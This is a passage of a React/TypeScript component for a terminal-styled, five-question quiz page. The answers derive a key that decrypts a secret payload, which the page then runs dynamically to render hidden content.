      setCurrentStep((prev) => prev - 1);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      e.preventDefault();
      if (currentStep < QUESTIONS.length - 1) {
        handleNext();
      } else {
        handleDecrypt();
      }
    }
  };

  const handleLockAgain = () => {
    if (cleanupRef.current) {
      cleanupRef.current();
      cleanupRef.current = null;
    }
    setDecryptedCode(null);
    setAnswers(["", "", "", "", ""]);
    setCurrentStep(0);
    setErrorMsg(null);
  };

  const handleDecrypt = async () => {
    setErrorMsg(null);

    if (!ENCRYPTED_SECRET_PAYLOAD) {
      setErrorMsg("未配置密文数据");
      return;
    }

    setIsDecrypting(true);

    try {
      const key = await deriveKeyFromAnswers(answers);
      const decrypted = await decryptSecretPayload(ENCRYPTED_SECRET_PAYLOAD, key);
      setDecryptedCode(decrypted);
    } catch {
      setErrorMsg("[ACCESS DENIED] 校验失败：答案不正确或密文无效。");
    } finally {
      setIsDecrypting(false);
    }
  };

  useEffect(() => {
    if (inputRef.current) {
      inputRef.current.focus();
    }
  }, [currentStep]);

  useEffect(() => {
    if (!decryptedCode || !containerRef.current) return;

    if (cleanupRef.current) {
      cleanupRef.current();
      cleanupRef.current = null;
    }

    try {
      const mountFunction = new Function("container", "THREE", "React", "context", decryptedCode);
      const cleanup = mountFunction(containerRef.current, THREE, React, {
        onLockAgain: handleLockAgain,
        onNavigateHome: () => {
          window.location.href = "/";
        }
      });

      if (typeof cleanup === "function") {
        cleanupRef.current = cleanup;
      }
    } catch (err) {
      setErrorMsg("动态执行解密代码失败: " + String(err));
      setDecryptedCode(null);
    }

    return () => {
      if (cleanupRef.current) {
        cleanupRef.current();
        cleanupRef.current = null;
      }
    };
  }, [decryptedCode]);

  if (decryptedCode !== null) {
    return <div ref={containerRef} style={{ width: "100%", minHeight: "100vh", fontFamily: '"Maple Mono NL", monospace' }} />;
  }

  const currentQuestionText = QUESTIONS[currentStep] || "";
  const isLastQuestion = currentStep === QUESTIONS.length - 1;

  return (
    <div
      style={{
        backgroundColor: isWindowsMode ? "#020a14" : "#030806",
        backgroundImage: isWindowsMode
          ? "radial-gradient(#001830 15%, #020a14 85%)"
          : "radial-gradient(#002211 15%, #030806 85%)",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "flex-start",
        padding: "50px 20px 80px",
        fontFamily: '"Maple Mono NL", monospace',
        color: isWindowsMode ? "#00b4ff" : "#00ff66",
        boxSizing: "border-box",
        position: "relative",
        overflowX: "hidden"
      }}
    >
      <BashStreamBackground isWindowsMode={isWindowsMode} />

      {/* 右上角 Windows Mode 切换开关 */}
      <div style={{ position: "fixed", top: "16px", right: "16px", zIndex: 100 }}>
        <button
          type="button"
          onClick={() => setIsWindowsMode((prev) => !prev)}
          style={{
            backgroundColor: isWindowsMode ? "#0078d7" : "#001a0d",
            color: isWindowsMode ? "#ffffff" : "#00ff66",
            border: isWindowsMode ? "2px solid #00d2ff" : "2px solid #00ff66",
            padding: "8px 16px",
            fontFamily: '"Maple Mono NL", monospace',
            fontSize: "0.85rem",
            fontWeight: "bold",
            cursor: "pointer",
            boxShadow: isWindowsMode ? "0 0 12px rgba(0, 120, 215, 0.7)" : "0 0 10px rgba(0, 255, 102, 0.3)"
          }}
        >
          {isWindowsMode ? "⊞ Windows Mode: ON (pwsh7)" : "⊞ Windows Mode: OFF"}
        </button>
      </div>

      <div
        style={{
          width: "100%",
          maxWidth: "760px",
          border: isWindowsMode ? "3px solid #00b4ff" : "3px solid #00ff66",
          backgroundColor: isWindowsMode ? "rgba(3, 15, 30, 0.94)" : "rgba(5, 17, 10, 0.94)",
          padding: "0",
          boxShadow: isWindowsMode
            ? "0 0 25px rgba(0, 180, 255, 0.25), inset 0 0 15px rgba(0, 180, 255, 0.05)"
            : "0 0 25px rgba(0, 255, 102, 0.25), inset 0 0 15px rgba(0, 255, 102, 0.05)",
          boxSizing: "border-box",
          position: "relative",
          zIndex: 1
        }}
      >
        <div
          style={{
            backgroundColor: isWindowsMode ? "#0078d7" : "#00ff66",
            color: isWindowsMode ? "#ffffff" : "#000000",
            padding: "8px 16px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            fontWeight: "bold",
            fontSize: "0.9rem",
            letterSpacing: "0.05em",
            fontFamily: '"Maple Mono NL", monospace'
          }}
        >
          <span>{isWindowsMode ? "PWSH://POWERSHELL_7.EXE" : "TERMINAL://AUTH_GATEWAY.EXE"}</span>
          <span>STEP {currentStep + 1}/5</span>
        </div>

        <div style={{ padding: "24px" }}>
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              marginBottom: "20px",
              borderBottom: isWindowsMode ? "1px dashed #004488" : "1px dashed #005522",
              paddingBottom: "12px"
            }}
          >
            <div style={{ display: "flex", gap: "8px" }}>
              {QUESTIONS.map((_, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => setCurrentStep(idx)}
                  style={{
                    backgroundColor: idx === currentStep
                      ? (isWindowsMode ? "#00b4ff" : "#00ff66")
                      : (isWindowsMode ? "#001e3d" : "#002211"),
                    color: idx === currentStep ? "#000000" : (isWindowsMode ? "#00b4ff" : "#00ff66"),
                    border: isWindowsMode ? "1px solid #00b4ff" : "1px solid #00ff66",
                    padding: "4px 10px",
                    fontFamily: '"Maple Mono NL", monospace',
                    fontSize: "0.85rem",
                    fontWeight: "bold",
                    cursor: "pointer"
                  }}
                >
                  Q{idx + 1}
                </button>
              ))}
            </div>

            <Link
              href="/"
              style={{
                color: isWindowsMode ? "#00b4ff" : "#00ff66",
                textDecoration: "underline",
                fontSize: "0.85rem",
                fontFamily: '"Maple Mono NL", monospace'
              }}
            >
              [ABORT & RETURN]
            </Link>
          </div>

          <div style={{ margin: "20px 0 24px 0" }}>
            <div style={{ color: isWindowsMode ? "#0088cc" : "#00aa44", fontSize: "0.85rem", marginBottom: "8px" }}>
              QUERY_PROMPT_ID: Q{currentStep + 1}
            </div>
            <div
              style={{
                backgroundColor: isWindowsMode ? "#010810" : "#020905",
                border: isWindowsMode ? "1px solid #004488" : "1px solid #005522",
                padding: "16px",
                color: "#ffff00",
                fontSize: "1.05rem",
                fontWeight: "bold",
                minHeight: "48px",
                lineHeight: "1.6",
                fontFamily: '"Maple Mono NL", monospace'
              }}
            >
              {currentQuestionText || `Q${currentStep + 1}:`}
            </div>
          </div>

          <div style={{ marginBottom: "24px" }}>
            <div style={{ color: isWindowsMode ? "#00b4ff" : "#00ff66", fontSize: "0.9rem", marginBottom: "8px", fontWeight: "bold" }}>
              ENTER ANSWER FOR Q{currentStep + 1}:
            </div>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                backgroundColor: "#000000",
                border: isWindowsMode ? "2px solid #00b4ff" : "2px solid #00ff66",
                padding: "4px 12px"
              }}
            >
              <span style={{ color: isWindowsMode ? "#00b4ff" : "#00ff66", fontSize: "1.2rem", fontWeight: "bold", marginRight: "8px" }}>
                {isWindowsMode ? "PS >" : ">"}
              </span>
              <input
                ref={inputRef}
                type="text"
                value={answers[currentStep]}
                onChange={(e) => handleAnswerChange(currentStep, e.target.value)}
                onKeyDown={handleKeyDown}
                disabled={isDecrypting}
                placeholder="键入答案并按 Enter..."
                style={{
                  width: "100%",
                  padding: "8px 0",
                  backgroundColor: "transparent",
                  border: "none",
                  color: isWindowsMode ? "#00b4ff" : "#00ff66",
                  fontFamily: '"Maple Mono NL", monospace',
                  fontSize: "1.05rem",
                  outline: "none"
                }}
              />
            </div>
          </div>

          {errorMsg && (
            <div
              style={{
                backgroundColor: "#220000",
                border: "1px solid #ff0044",
                color: "#ff4466",
                padding: "12px",
                marginBottom: "20px",
                fontSize: "0.9rem",
                fontFamily: '"Maple Mono NL", monospace'
              }}
            >
              [ERROR]: {errorMsg}
            </div>
          )}

          <div style={{ display: "flex", justifyContent: "space-between", gap: "12px", marginTop: "28px" }}>
            <button
              type="button"
              onClick={handlePrev}
              disabled={currentStep === 0 || isDecrypting}
              style={{
                flex: "1",
                padding: "12px",
                backgroundColor: currentStep === 0
                  ? (isWindowsMode ? "#001122" : "#001a0d")
                  : (isWindowsMode ? "#002b4d" : "#00331a"),
                border: isWindowsMode ? "1px solid #00b4ff" : "1px solid #00ff66",
                color: currentStep === 0
                  ? (isWindowsMode ? "#005588" : "#006633")
                  : (isWindowsMode ? "#00b4ff" : "#00ff66"),
                fontFamily: '"Maple Mono NL", monospace',
                fontSize: "0.95rem",
                fontWeight: "bold",
                cursor: currentStep === 0 ? "not-allowed" : "pointer"
              }}
            >
              [&lt; PREV // 上一题]
            </button>

            {!isLastQuestion ? (
              <button
                type="button"
                onClick={handleNext}
                disabled={isDecrypting}
                style={{
                  flex: "1",
                  padding: "12px",
                  backgroundColor: isWindowsMode ? "#002b4d" : "#00331a",
                  border: isWindowsMode ? "1px solid #00b4ff" : "1px solid #00ff66",
                  color: isWindowsMode ? "#00b4ff" : "#00ff66",
                  fontFamily: '"Maple Mono NL", monospace',
                  fontSize: "0.95rem",
                  fontWeight: "bold",
                  cursor: "pointer"
                }}
              >
                [NEXT &gt; // 下一题]
              </button>
            ) : (
              <button
                type="button"
                onClick={handleDecrypt}
                disabled={isDecrypting}
                style={{
                  flex: "1",
                  padding: "12px",
                  background: isWindowsMode
                    ? "linear-gradient(135deg, #00b4ff 0%, #0078d7 100%)"
                    : "linear-gradient(135deg, #00ff66 0%, #00cc55 100%)",
                  border: "2px solid #ffffff",
                  color: "#000000",
                  fontFamily: '"Maple Mono NL", monospace',
                  fontSize: "0.95rem",
                  fontWeight: "bold",
                  cursor: isDecrypting ? "not-allowed" : "pointer",
                  letterSpacing: "0.05em"
                }}
              >
                {isDecrypting ? "[DECRYPTING...]" : "[⚡ DECRYPT SECRET]"}
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
